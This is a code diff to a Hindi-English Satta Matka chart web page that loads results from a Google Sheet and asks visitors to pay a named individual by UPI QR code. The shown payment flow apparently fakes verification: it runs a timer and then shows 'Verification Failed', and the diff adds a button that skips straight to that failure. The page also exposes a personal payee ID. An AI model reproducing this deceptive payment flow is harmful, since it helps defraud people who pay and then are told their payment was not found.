@@ -50,6 +50,9 @@
         .qr-img { width: 160px; height: 160px; margin: 10px auto; border: 3px solid var(--yellow-accent); }
         .verify-btn { background: #28a745; color: #fff; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; }
         
+        /* Next/Age Bade Button Style */
+        .next-fast-btn { background: none; border: none; color: #007bff; font-weight: bold; text-decoration: underline; cursor: pointer; margin-top: 10px; font-size: 14px; display: block; width: 100%; }
+
         .disclaimer { width: 85%; margin: 15px auto; padding: 10px; background: rgba(255,255,255,0.5); border-radius: 8px; font-size: 10px; color: #444; border: 1px dashed var(--dark-blue); }
     </style>
 </head>
@@ -111,18 +114,21 @@
             <h3 id="payTitle" style="margin:5px 0;"></h3>
             <p style="margin:2px; font-size:13px;"><strong>Pay to: Omkar Yadav</strong></p>
             <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=8103982813@ptsbi%26pn=Omkar%20Yadav%26cu=INR" class="qr-img">
+            
             <div id="timerBox">
                 <p style="margin:0; font-size:12px; color:red;">Verifying Payment... Please Wait</p>
                 <div id="timerText">02:00</div>
+                <button class="next-fast-btn" onclick="showFailed()">Next / आगे बढ़ें ➔</button>
             </div>
+
             <input type="number" id="utrInput" placeholder="Enter 12 Digit UTR No.">
             <button class="verify-btn" id="verifyBtn" onclick="handleVerify()">VERIFY PAYMENT</button>
         </div>
 
         <div id="stepFailed" style="display:none;">
-            <h2 style="font-size:40px; color:red; margin:10px 0;">⚠️</h2>
+            <div style="font-size:50px; color:red; margin:10px 0;">❌</div>
             <h3 style="color:red; margin:5px 0;">Verification Failed!</h3>
-            <p style="font-size:13px;">UTR नंबर गलत है। कृपया दोबारा कोशिश करें।</p>
+            <p style="font-size:13px;">UTR नंबर या पेमेंट रिकॉर्ड नहीं मिला। कृपया सही जानकारी के साथ दोबारा कोशिश करें।</p>
             <button class="verify-btn" onclick="resetSteps()" style="background:#4fb5f5;">TRY AGAIN</button>
         </div>
     </div>
@@ -163,7 +169,7 @@
 
     function handleVerify() {
         let utr = document.getElementById('utrInput').value;
-        if(utr.length < 10) { alert("UTR नंबर सही नहीं है।"); return; }
+        if(utr.length < 10) { alert("कृपया 12 अंकों का UTR नंबर डालें।"); return; }
         document.getElementById('verifyBtn').disabled = true;
         document.getElementById('verifyBtn').innerText = "Checking...";
         document.getElementById('timerBox').style.display = 'block';
@@ -183,18 +189,17 @@
     }
 
     function showFailed() {
+        clearInterval(timerId); // टाइमर रोक दें
         document.getElementById('stepPay').style.display = 'none';
         document.getElementById('stepFailed').style.display = 'block';
     }
 
-    // --- CHART LOADING LOGIC ---
     const CSV_URL = "https://docs.google.com/spreadsheets/d/1IReRyQjRvWWVjZTym_8DDXvx9Jttjfgy18McY53gM5w/export?format=csv";
 
     async function loadChart() {
         const gridData = document.getElementById('gridData');
         try {
             const response = await fetch(CSV_URL + "&cache=" + new Date().getTime());
-            if (!response.ok) throw new Error("Network issue");
             const csvText = await response.text();
             const rows = csvText.split('\n').map(r => r.split(','));
             
@@ -206,7 +211,6 @@
                 if (!dateStr) continue;
 
                 html += `<div class="date-box">${dateStr}</div>`;
-
                 for(let j = 1; j <= 16; j += 3) {
                     let leftPanna = (rows[i][j] || "").trim().replace(/"/g, "");
                     let jodi = (rows[i][j+1] || "").trim().replace(/"/g, "");
@@ -220,25 +224,21 @@
                             html += `<div class="cell"></div>`;
                         }
                     } else {
-                        // Lal Ghar Logic
                         let isRed = (jodi.length >= 2 && (jodi[0] === jodi[1] || Math.abs(parseInt(jodi[0]) - parseInt(jodi[1])) === 5)) || jodi.includes('*');
-                        
-                        let leftDisplay = leftPanna.split('').map(s => `<span>${s}</span>`).join('');
-                        let rightDisplay = rightPanna.split('').map(s => `<span>${s}</span>`).join('');
+                        let lp = leftPanna.split('').map(s => `<span>${s}</span>`).join('');
+                        let rp = rightPanna.split('').map(s => `<span>${s}</span>`).join('');
 
-                        html += `
-                            <div class="cell ${isRed ? 'red-house' : ''}">
-                                <div class="panna left">${leftDisplay}</div>
+                        html += `<div class="cell ${isRed ? 'red-house' : ''}">
+                                <div class="panna left">${lp}</div>
                                 <div class="jodi">${jodi}</div>
-                                <div class="panna right">${rightDisplay}</div>
+                                <div class="panna right">${rp}</div>
                             </div>`;
                     }
                 }
             }
             gridData.innerHTML = html;
         } catch (error) {
-            console.error(error);
-            gridData.innerHTML = `<div style="grid-column: span 7; padding: 20px; color: red;">डेटा लोड करने में समस्या आई। कृपया पेज रिफ्रेश करें।</div>`;
+            gridData.innerHTML = `<div style="grid-column: span 7; padding: 20px;">Data loading... Please refresh.</div>`;
         }
     }
 
